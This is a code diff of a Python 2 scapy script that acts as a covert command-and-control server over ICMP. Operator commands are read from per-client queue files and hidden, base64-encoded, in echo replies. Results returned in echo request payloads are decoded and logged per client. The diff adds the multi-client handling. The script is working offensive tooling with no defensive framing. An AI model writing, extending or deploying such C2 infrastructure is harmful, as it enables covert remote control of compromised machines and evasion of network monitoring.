@@ -1,5 +1,4 @@
 #!/usr/bin/python2
-# Dear future self: You used to suck at code. You probably still do.
 
 from scapy.all import *
 from random import randrange
@@ -7,9 +6,9 @@ from base64 import b64decode, b64encode
 
 import socket
 
-def process_c2_call(payload):
+def process_c2_call(payload, client_id):
     output_to_file = b64decode(payload)
-    with open('c2_output', 'a+') as output_file:
+    with open('c2_output.{}'.format(client_id), 'a+') as output_file:
         output_file.write(output_to_file+'\n')
 
 def is_c2_appropriate():
@@ -18,18 +17,17 @@ def is_c2_appropriate():
     else:
         return False
 
-def generate_command():
-    with open('command_list', 'r') as file_read:
+def generate_command(client_id):
+    with open('command_list.{}'.format(client_id), 'a+') as file_read:
         read_data = file_read.readlines()
         try:
             next_command = read_data.pop(0)
         except:
             next_command = ""
-    with open('command_list', 'w+') as file_write:
+    with open('command_list.{}'.format(client_id), 'w+') as file_write:
         for i in read_data:
             file_write.write("{}".format(i))
     return next_command
-
 
 def generate_reply_packet(packet_dst, packet_icmp_id, packet_icmp_seq, packet_payload):
     print('generating packet!')
@@ -55,10 +53,10 @@ def main():
             ip_src = scapy_packet.src
             if len(echo_request_payload) > 10:
                 print('command return detected')
-                process_c2_call(echo_request_payload[10:])
+                process_c2_call(echo_request_payload[10:], echo_request_id)
             if is_c2_appropriate():
                 print('totally appropriate')
-                c2_command_payload += b64encode(generate_command())
+                c2_command_payload += b64encode(generate_command(echo_request_id))
             send(generate_reply_packet(scapy_packet.src, scapy_packet[ICMP].id, scapy_packet[ICMP].seq, c2_command_payload))
             print('packet sent!')
 
